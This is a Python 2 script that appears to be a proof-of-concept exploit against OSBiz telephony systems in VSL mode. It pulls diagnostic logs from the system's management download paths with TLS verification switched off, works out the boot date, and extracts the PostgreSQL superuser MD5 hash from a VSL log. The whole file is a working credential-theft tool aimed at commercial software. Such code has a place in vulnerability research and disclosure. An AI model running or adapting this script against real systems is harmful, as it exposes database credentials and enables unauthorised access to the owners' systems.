#!/usr/bin/python
# coding=utf-8

'''
Get generated postgres superuser hash on startup from OSBiz systems running in VSL mode.
+ Get OSBiz IP address
+ Check if running in VSL mode
+ Get boot time, based on this get the correct logs containing the hash.
- Check how long logs will be available.. probably there will be a cleanup cycle.. otherwise requires manual OSBiz reboot.
*\@ braam.vanhavermaet*bkm.be
Version: 1.0
'''

from operator import truediv
import sys, os
import requests, socket
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urlparse import urlparse

#>> Global variables
OSBizIP = ""
#<< end Global variables

## ** HACKS
#Disable securtiy warnings, by self signed certificates using requests.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
## HACKS **
 

'''
 ** Functions
'''
def getURL(cmd):
    page = requests.get("https://"+OSBizIP+"/"+cmd, verify=False)
    return page.content

def checkConnection():
    url = urlparse("https://"+OSBizIP+":443/")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3) #timeout to check in seconds.
    result = sock.connect_ex((url.hostname,url.port))
    if result == 0:
        #Download OsoStatusServer.log file and store on disk.
        file = getURL("management/downloads/trace_log/diag/OsoStatusServer.log")
        open('OsoStatusServer.log', 'wb').write(file)
        return True
    else:
        return False

def checkVSL():
    with open("OsoStatusServer.log", "r") as file:
        second_last_line = file.readlines()[-2] #get only the second last line.
    
    if "OSB mode: UC Suite" in second_last_line:
        return True
    else:
        return False

def getPostgresHash():
    #Get first the boot time from the downloaded log file.
    with open("OsoStatusServer.log", "r") as file:
        last_line = file.readlines()[-1] #get only the last line.
    bootDate = last_line.split(" ")[0].replace("/","-")
    
    #Get the log file containing the hash
    hashFile = getURL("management/downloads/trace_log/vsl/log/vs-"+bootDate+".log")
    open('postgresHashFile.log', 'wb').write(hashFile)

    for line in reversed(list(open("postgresHashFile.log"))): #Open file reversed, so the first hit will contain the latest hash.
        if "md5" in line:
            print("Found hash for user postgres: " + line[line.find("'")+len("'"):line.rfind("'")])
            exit()
    

'''
 ** @@MAIN@@
'''
#Retrieve IP address from argument.
if len(sys.argv) >1:
        OSBizIP = str(sys.argv[1])
else:
        print("Usage: " + os.path.basename(__file__) + " <IP address>" + "\n!>>->> Bye.")
        exit()

if checkConnection(): #Check first if we can connect to the OSBiz system.
    if checkVSL(): #check if target is running in VSL mode.
        getPostgresHash() #Retrieve the hash.
    else:
        print("ERROR, target is not running in VSL mode.")
        exit()
else:
    print("ERROR, IP address " + OSBizIP + " not responding, please check your connection.")
    exit()

